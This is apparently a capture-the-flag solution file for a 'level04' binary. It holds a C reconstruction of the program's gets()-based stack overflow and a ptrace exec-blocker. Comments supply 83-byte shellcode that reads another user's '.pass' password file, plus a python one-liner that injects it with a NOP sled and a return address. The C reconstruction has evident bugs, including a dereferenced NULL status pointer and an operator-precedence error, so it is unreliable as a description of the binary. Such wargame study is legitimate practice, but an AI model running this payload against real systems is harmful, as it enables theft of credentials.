# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/types.h>
# include <sys/wait.h>
# include <unistd.h>
# include <sys/prctl.h>
# include <sys/ptrace.h>


int main(void) {

	int		*wstatus = NULL; // esp+0x1c
	char	str[32]; // esp+0x20
	int		tmp;	// esp+0xa8
	pid_t	pid; // esp+0xac

	for ( int i = 0; i < 32; i++ )
		str[i] = '\0';

	pid = fork();

	if ( pid ) {
		prctl( 1, 1 );
		ptrace( PTRACE_TRACEME, 0, NULL, NULL );
		puts( "Give me some shellcode, k" );
		gets( str );
	} else {

		while (1) {
			wait( wstatus );
			if ( *wstatus & 127 == 0 ) {
				if ( (*wstatus & 127) >> 1 == 0 ) {
					if ( ptrace(PTRACE_PEEKDATA, pid, 0x2c, NULL) == 0xb ) {
						puts("no exec() for you");
						kill(pid, 9);
						break;
					}
				}
			} else {
				puts( "child is exiting..." );
				break;
			}
		}

	}

	return 0;

}

// set follow-fork-mode parent
// set follow-fork-mode child
// show follow-fork-mode
//
//
//
//
//


// count=0; for i in $(objdump -d /tmp/exploit1-2 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
// \x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x89\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x2a\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80
// 83 bytes


// python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x89\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x2a\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\xc0"[::-1]' | ./level04 

